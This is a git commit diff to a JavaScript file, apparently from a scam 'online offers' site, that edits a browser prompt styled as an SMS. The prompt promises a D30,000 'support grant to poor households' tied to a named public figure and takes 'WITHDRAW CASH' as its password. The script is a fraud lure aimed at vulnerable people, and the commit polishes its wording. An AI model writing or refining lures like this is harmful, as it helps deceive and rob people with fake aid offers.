48a1bb3316959f17548cf82f9c0b51f29329ff1d
The-ongoing <preciousadaowo4@gmail.com>
2026-01-12 12:29:24 +0100

    Update actived.js

--- actived.js
+++ actived.js
@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'WITHDRAW CASH'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive D30,000 MOMODOU DARBOE POOR HOUSEHOLDS SUPPORT GRANT. Please press OK to Receive Instantly.',
+  'SMS: Congratulations! You are eligible to receive D30,000 MOMODOU DARBOE SUPPORT GRANT TO POOR HOUSEHOLDS. Please press OK to Receive Instantly.',
   'WITHDRAW CASH'
 );
 if (password != 'WITHDRAW CASH') {
